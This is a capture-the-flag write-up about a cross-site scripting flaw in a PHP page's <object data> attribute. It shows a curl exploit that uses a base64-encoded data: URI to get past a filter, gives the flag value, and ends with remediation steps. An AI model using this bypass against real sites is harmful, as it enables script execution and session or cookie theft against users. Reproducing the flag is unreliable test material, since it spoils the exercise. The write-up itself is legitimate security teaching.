# Breach #14: Object Tag Injection via `data:` URI

## Flag
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

## Vulnerability Type

**OWASP A03:2021 - Injection** (CWE-79: Cross-Site Scripting via Object Tag)

## Location

```
http://localhost:8081/index.php?page=media&src=
```

The homepage links to `?page=media&src=nsa`, which embeds an image using an `<object data="...">` tag. The `src` parameter controls what gets loaded inside that object tag.

## How It Works

1. **Discovery**: On the homepage, there is a link to the media page:
   ```html
   <a href="?page=media&src=nsa">
   ```

2. **Normal behavior**: With `src=nsa`, the server renders:
   ```html
   <object data="http://10.0.2.15/images/nsa_prism.jpg"></object>
   ```
   It maps the short name `nsa` to the image file `nsa_prism.jpg`.

3. **The vulnerability**: The `src` parameter is injected directly into the `<object data="...">` attribute without proper validation. This allows injecting a `data:` URI to embed arbitrary HTML/JavaScript.

4. **Filter bypass**: A raw `data:text/html,<script>...</script>` payload gets detected and returns "WrongAnswer". However, **base64 encoding** the payload bypasses the filter entirely.

## Exploit

```bash
curl -s "http://localhost:8081/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep flag
```

Where the base64 payload decodes to:
```html
<script>alert(1)</script>
```

### Encoding the payload

```bash
echo -n '<script>alert(1)</script>' | base64
# Output: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### What happens

| Payload | Result |
|---|---|
| `src=nsa` | Normal image displayed |
| `src=data:text/html,<script>alert(1)</script>` | ❌ "WrongAnswer" — raw HTML is filtered |
| `src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | ✅ Flag revealed — base64 bypasses the filter |

## Why It's Dangerous

- The `<object>` tag can load arbitrary content types (HTML, SVG, Flash, etc.)
- `data:` URIs allow embedding inline content without fetching from a server
- Base64 encoding is a trivial way to bypass naive input sanitization
- An attacker could use this to execute JavaScript in the context of the victim's session (session hijacking, cookie theft, etc.)

## Remediation

1. **Whitelist allowed `src` values** — Only accept known, predefined values (`nsa`, `prism`, etc.) rather than passing raw input to the `data` attribute
2. **Never embed user input in `<object data="">`** — This is equivalent to injecting into an `<iframe src="">`
3. **Validate URI scheme** — Block `data:`, `javascript:`, and `vbscript:` URI schemes
4. **Content Security Policy (CSP)** — Use `object-src 'none'` to prevent object tag abuse entirely
5. **Output encoding** — HTML-encode all user input before inserting it into HTML attributes
